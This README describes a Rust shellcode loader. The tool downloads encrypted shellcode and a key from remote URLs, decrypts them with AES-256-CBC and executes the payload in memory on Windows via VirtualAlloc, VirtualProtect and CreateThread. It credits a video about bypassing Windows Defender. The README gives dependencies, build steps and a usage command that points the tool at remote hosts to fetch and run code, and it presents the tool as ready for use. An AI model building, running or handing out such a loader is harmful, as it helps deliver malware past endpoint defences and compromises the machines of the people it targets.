AES-256-CBC Shellcode Decryptor and Executor in Rust

This Rust application fetches encrypted shellcode and an encryption key from provided URLs, decrypts the shellcode using AES-256-CBC, and executes it in memory on Windows systems. It uses PBKDF2-inspired concepts and relies on Windows API calls for memory allocation and execution. This project was inspired by foundational knowledge from Gemini Cyber Securityâ€™s video "Getting Started with Rust - Bypass Windows Defender".

Features

    AES-256-CBC Decryption: Decrypts shellcode using the AES-256 algorithm in CBC mode.
    Remote File Fetching: Retrieves encrypted shellcode and keys from HTTP URLs using reqwest.
    In-Memory Execution: Allocates memory and executes decrypted shellcode via Windows API calls (VirtualAlloc, VirtualProtect, CreateThread).
    Zero-Initialized IV: Uses a static IV for simplicity (not recommended for production use).

Prerequisites

    Rust: Ensure Rust is installed. Install it via Rustup if needed:
    bash

    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
    Windows OS: This project uses Windows-specific APIs (windows-sys) and is not compatible with other operating systems.
    Internet Access: Required to fetch files from provided URLs.

Building the Project
1. Clone the Repository

Clone this repository and navigate to the project directory:
bash
git clone <repository_url>
cd <repository_name>
2. Install Dependencies

The project relies on several Rust crates. Ensure your Cargo.toml includes the following:
toml
[dependencies]
aes = "0.8"
block-modes = "0.8"
pbkdf2 = "0.12"
sha2 = "0.10"
hex = "0.4"
hmac = "0.12"
reqwest = { version = "0.11", features = ["blocking"] }
windows-sys = { version = "0.52", features = ["Win32_Foundation", "Win32_System_Memory", "Win32_System_Threading"] }

Then, build the project in release mode:
bash
cargo build --release

The compiled binary will be located in the target/release directory.
Usage

Run the application with the following command, providing URLs to the encrypted shellcode and the encryption key:
bash
./target/release/rust -exec <http://ip_address/encrypted> <http://ip_address/key>
Example
bash
./target/release/rust -exec http://example.com/encrypted_shellcode http://example.com/key

This will:

    Fetch the encrypted shellcode and key from the specified URLs.
    Decrypt the shellcode using AES-256-CBC with a zero-initialized IV.
    Allocate executable memory, copy the decrypted shellcode, and execute it as a new thread.

If successful, the program will output:
text
Decryption and execution succeeded.
Security Considerations

    Static IV: The initialization vector (IV) is set to zero, which compromises security by making the encryption predictable. For real-world use, use a cryptographically secure random IV.
    Key Management: The key is fetched remotely but not validated. Ensure the key source is trusted and secure.
    Shellcode Execution: Executing arbitrary code in memory can be dangerous and is intended for controlled environments only.
    Error Handling: Basic error reporting is implemented, but robust error handling should be added for production use.
